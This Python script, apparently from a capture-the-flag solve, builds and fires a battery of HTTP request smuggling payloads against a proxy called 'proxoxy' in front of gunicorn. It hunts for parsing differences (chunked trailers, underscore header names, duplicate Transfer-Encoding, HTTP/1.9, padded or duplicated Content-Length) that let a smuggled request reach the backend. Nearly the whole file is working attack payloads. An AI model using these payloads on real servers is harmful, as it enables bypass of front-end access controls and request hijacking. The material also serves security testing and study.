#!/usr/bin/env python3
"""
Session-2 desync battery: hunt a case where proxoxy consumes MORE bytes
for request 1 than gunicorn does, so the tail becomes a real request to gunicorn.
"""
import sys
_CH = __import__("os").path.dirname(__import__("os").path.dirname(__import__("os").path.abspath(__file__)))

sys.path.insert(0, f"{_CH}/solve")
from diff2 import t, SMUG  # noqa: E402

CRLF = b"\r\n"


def req(line, headers, body=b""):
    h = b"".join(k + b": " + v + CRLF for k, v in headers)
    return line + CRLF + h + CRLF + body


TESTS = []


def add(name, payload, wake=True):
    TESTS.append((name, payload, wake))


# --- T1 family: chunked trailer-section swallow -------------------------------
head_ch = (b"POST /health HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\n\r\n")
add("T1  0CRLF CRLF + smuggled", head_ch + b"0\r\n\r\n" + SMUG)
add("T1b 0CRLF CRLF + smuggled + CRLFCRLF", head_ch + b"0\r\n\r\n" + SMUG + b"\r\n")
add("T1c chunk then 0CRLF CRLF + smuggled",
    head_ch + b"4\r\nAAAA\r\n0\r\n\r\n" + SMUG)
add("T1d 0CRLF trailer CRLFCRLF + smuggled",
    head_ch + b"0\r\nX-T: 1\r\n\r\n" + SMUG)

# --- T3 family: underscore header names --------------------------------------
add("T3a Content_Length only",
    req(b"POST /health HTTP/1.1", [(b"Host", b"h"), (b"Content_Length", str(len(SMUG)).encode())]) + SMUG)
add("T3b CONTENT_LENGTH only",
    req(b"POST /health HTTP/1.1", [(b"Host", b"h"), (b"CONTENT_LENGTH", str(len(SMUG)).encode())]) + SMUG)
add("T3c Transfer_Encoding chunked",
    req(b"POST /health HTTP/1.1", [(b"Host", b"h"), (b"Transfer_Encoding", b"chunked")])
    + b"%x\r\n" % len(SMUG) + SMUG + b"\r\n0\r\n\r\n")
add("T3d control X_Foo accepted?",
    req(b"GET /health HTTP/1.1", [(b"Host", b"h"), (b"X_Foo", b"bar")]), wake=False)
add("T3e CL0 + Content_Length N",
    req(b"POST /health HTTP/1.1", [(b"Host", b"h"), (b"Content-Length", b"0"),
                                   (b"Content_Length", str(len(SMUG)).encode())]) + SMUG)

# --- T5 family: multiple Transfer-Encoding lines -----------------------------
add("T5a TE identity then TE chunked",
    req(b"POST /health HTTP/1.1", [(b"Host", b"h"), (b"Transfer-Encoding", b"identity"),
                                   (b"Transfer-Encoding", b"chunked")])
    + b"0\r\n\r\n" + SMUG)
add("T5b TE 'identity, chunked'",
    req(b"POST /health HTTP/1.1", [(b"Host", b"h"), (b"Transfer-Encoding", b"identity, chunked")])
    + b"0\r\n\r\n" + SMUG)

# --- T9: HTTP version differential -------------------------------------------
add("T9a HTTP/1.9 + chunked",
    b"POST /health HTTP/1.9\r\nHost: h\r\nTransfer-Encoding: chunked\r\n\r\n"
    + b"%x\r\n" % len(SMUG) + SMUG + b"\r\n0\r\n\r\n")

# --- T17: duplicate identical CL ---------------------------------------------
add("T17 dup identical CL",
    req(b"POST /health HTTP/1.1", [(b"Host", b"h"), (b"Content-Length", b"0"),
                                   (b"Content-Length", b"0")]) + SMUG)

# --- T20: CL parsing edges ----------------------------------------------------
n = str(len(SMUG)).encode()
add("T20a CL leading zeros", req(b"POST /health HTTP/1.1",
                                 [(b"Host", b"h"), (b"Content-Length", b"00000" + n)]) + SMUG)
add("T20b CL tab padded", req(b"POST /health HTTP/1.1",
                              [(b"Host", b"h"), (b"Content-Length", b"\t" + n + b"\t")]) + SMUG)

if __name__ == "__main__":
    only = sys.argv[1] if len(sys.argv) > 1 else ""
    for name, payload, wake in TESTS:
        if only and not name.startswith(only):
            continue
        try:
            t(name, payload, wake=wake)
        except Exception as e:  # noqa: BLE001
            print(f"### {name}\n    ERROR {e!r}")
